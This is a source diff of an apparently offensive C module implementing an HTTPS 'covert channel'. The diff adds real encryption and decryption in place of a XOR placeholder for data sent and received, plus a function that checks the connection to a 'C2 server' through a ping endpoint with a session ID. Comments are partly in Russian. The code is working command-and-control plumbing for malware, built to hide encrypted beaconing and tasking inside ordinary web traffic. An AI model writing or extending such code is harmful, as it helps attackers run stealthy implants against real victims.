@@ -10,6 +10,7 @@
 #include <string.h>
 #include <time.h>
 #include "../include/covert_channel.h"
+#include "../include/crypto_utils.h"
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -281,35 +282,40 @@ int https_channel_send(CovertChannelHandle handle, const unsigned char* data, si
     }
 
     // Encrypt data if encryption is enabled
-    unsigned char* encrypted_data = (unsigned char*)data;
-    size_t encrypted_len = data_len;
-    unsigned char* temp_buffer = NULL;
+    const unsigned char* data_to_encode = data;
+    size_t data_to_encode_len = data_len;
+    unsigned char* encrypted_buffer = NULL;
     
     if (channel->encryption != ENC_NONE && channel->encryption_key) {
-        temp_buffer = (unsigned char*)malloc(data_len + 32); // Extra space for padding
-        if (!temp_buffer) {
-            return -1;
-        }
+        int result = encrypt_data(channel->encryption,
+                                  channel->encryption_key,
+                                  channel->key_length,
+                                  data,
+                                  data_len,
+                                  &encrypted_buffer,
+                                  &data_to_encode_len);
         
-        // Placeholder for actual encryption (would implement AES, etc. here)
-        // For now, just use simple XOR to show the concept
-        for (size_t i = 0; i < data_len; i++) {
-            temp_buffer[i] = data[i] ^ channel->encryption_key[i % channel->key_length];
+        if (result <= 0 || encrypted_buffer == NULL) {
+            fprintf(stderr, "HTTPS Send: Encryption failed!\n");
+            return -1; // Ошибка шифрования
         }
-        
-        encrypted_data = temp_buffer;
-        encrypted_len = data_len; // Actual encryption might change length
+        data_to_encode = encrypted_buffer;
+    } else {
+        // Если шифрование отключено, data_to_encode остается data
     }
     
-    // Encode the encrypted data (base64 or similar)
+    // Encode the data (encrypted or original) using Base64
     size_t encoded_len = 0;
-    char* encoded_data = https_encode_data(encrypted_data, encrypted_len, &encoded_len);
+    char* encoded_data = https_encode_data(data_to_encode, data_to_encode_len, &encoded_len);
     
-    if (temp_buffer) {
-        free(temp_buffer);
+    // Освобождаем временный буфер шифрования, если он был создан
+    if (encrypted_buffer) {
+        free_crypto_buffer(encrypted_buffer);
+        encrypted_buffer = NULL;
     }
     
     if (!encoded_data) {
+        fprintf(stderr, "HTTPS Send: Base64 encoding failed!\n");
         return -1;
     }
     
@@ -324,6 +330,7 @@ int https_channel_send(CovertChannelHandle handle, const unsigned char* data, si
     free(encoded_data);
     
     if (res <= 0) {
+         fprintf(stderr, "HTTPS Send: Sending request failed!\n");
         return -1;
     }
     
@@ -355,39 +362,69 @@ int https_channel_receive(CovertChannelHandle handle, unsigned char* buffer, siz
     int res = https_send_request(channel, "GET", endpoint, NULL, 0, response, HTTPS_BUFFER_SIZE);
     
     if (res <= 0) {
+        //fprintf(stderr, "HTTPS Receive: Polling failed or no data.\n");
         return 0; // No data available or error
     }
     
     // Find the response body (after \r\n\r\n)
     char* body = strstr(response, "\r\n\r\n");
     if (!body) {
+        fprintf(stderr, "HTTPS Receive: Invalid response format (no body).\n");
         return 0;
     }
     body += 4; // Skip \r\n\r\n
     
-    // Decode the response
+    // Decode the response from Base64
     size_t decoded_len = 0;
     unsigned char* decoded_data = https_decode_data(body, strlen(body), &decoded_len);
     
-    if (!decoded_data) {
+    if (!decoded_data || decoded_len == 0) {
+         if (decoded_data) free(decoded_data); // Освободить если аллоцировано, но длина 0
+         // fprintf(stderr, "HTTPS Receive: Base64 decoding failed or empty data.\n");
         return 0;
     }
     
     // Decrypt if encryption was used
+    unsigned char* final_data = NULL;
+    size_t final_data_len = 0;
+    int ret_len = 0;
+
     if (channel->encryption != ENC_NONE && channel->encryption_key) {
-        // Placeholder for actual decryption (would implement AES, etc. here)
-        // For simplicity, just using XOR
-        for (size_t i = 0; i < decoded_len; i++) {
-            decoded_data[i] = decoded_data[i] ^ channel->encryption_key[i % channel->key_length];
+        int result = decrypt_data(channel->encryption,
+                                  channel->encryption_key,
+                                  channel->key_length,
+                                  decoded_data,
+                                  decoded_len,
+                                  &final_data,
+                                  &final_data_len);
+        
+        free(decoded_data); // Освобождаем буфер от Base64 декодирования
+        decoded_data = NULL;
+        
+        if (result <= 0 || final_data == NULL) {
+            fprintf(stderr, "HTTPS Receive: Decryption failed!\n");
+            return -1; // Ошибка дешифрования
         }
+        
+        // Копируем расшифрованные данные в выходной буфер
+        size_t copy_len = (final_data_len < buffer_size) ? final_data_len : buffer_size;
+        memcpy(buffer, final_data, copy_len);
+        ret_len = (int)copy_len;
+        
+        free_crypto_buffer(final_data); // Освобождаем буфер от дешифрования
+        final_data = NULL;
+        
+    } else {
+        // Шифрование не используется, копируем декодированные Base64 данные
+        size_t copy_len = (decoded_len < buffer_size) ? decoded_len : buffer_size;
+        memcpy(buffer, decoded_data, copy_len);
+        ret_len = (int)copy_len;
+        
+        free(decoded_data); // Освобождаем буфер от Base64 декодирования
+        decoded_data = NULL;
     }
     
-    // Copy data to output buffer, truncating if necessary
-    size_t copy_len = (decoded_len < buffer_size) ? decoded_len : buffer_size;
-    memcpy(buffer, decoded_data, copy_len);
-    
-    free(decoded_data);
-    return (int)copy_len;
+    return ret_len;
 }
 
 void https_channel_cleanup(CovertChannelHandle handle) {
@@ -646,4 +683,57 @@ static unsigned char* https_decode_data(const char* encoded, size_t encoded_len,
     }
     
     return decoded;
+}
+
+/**
+ * @brief Проверяет, активно ли соединение с сервером C2
+ * 
+ * @param handle Дескриптор канала
+ * @return bool true, если соединение активно, иначе false
+ */
+bool https_channel_check_connection(CovertChannelHandle handle) {
+    HttpsChannelData* channel = (HttpsChannelData*)handle;
+    if (!channel || channel->socket == -1) {
+        return false;
+    }
+
+    // Создаем endpoint для ping-запроса
+    // Можно использовать базовый URI или специальный endpoint
+    char endpoint[256];
+    snprintf(endpoint, sizeof(endpoint), "%s/ping?session=%s", channel->uri_path, channel->session_id);
+    
+    // Буфер для ответа (нам не нужен сам ответ, только статус)
+    char response[1024]; // Достаточно для заголовков
+    
+    // Отправляем простой GET-запрос
+    int res = https_send_request(channel, "GET", endpoint, NULL, 0, response, sizeof(response));
+    
+    if (res <= 0) {
+        // Ошибка отправки/получения или таймаут
+        // Соединение, скорее всего, потеряно
+        #ifdef DEBUG
+        fprintf(stderr, "HTTPS Check Connection: Failed to send/receive ping request (res=%d)\n", res);
+        #endif
+        // Попытка переподключения?
+        // Возможно, стоит закрыть текущее соединение здесь
+        // https_channel_cleanup(handle);
+        // channel->connected = 0; 
+        return false;
+    }
+    
+    // Проверяем HTTP статус ответа (должен быть 2xx, например 200 OK)
+    if (strstr(response, "HTTP/1.1 200 OK") != NULL || strstr(response, "HTTP/1.0 200 OK") != NULL) {
+         #ifdef DEBUG
+         // fprintf(stderr, "HTTPS Check Connection: OK\n");
+         #endif
+        return true; // Соединение активно
+    } else {
+        #ifdef DEBUG
+        fprintf(stderr, "HTTPS Check Connection: Received non-200 status or invalid response.\nResponse Headers:\n%s\n", response);
+        #endif
+         // Можно также считать соединение потерянным при не-200 ответе
+         // https_channel_cleanup(handle);
+         // channel->connected = 0; 
+        return false; 
+    }
 } 
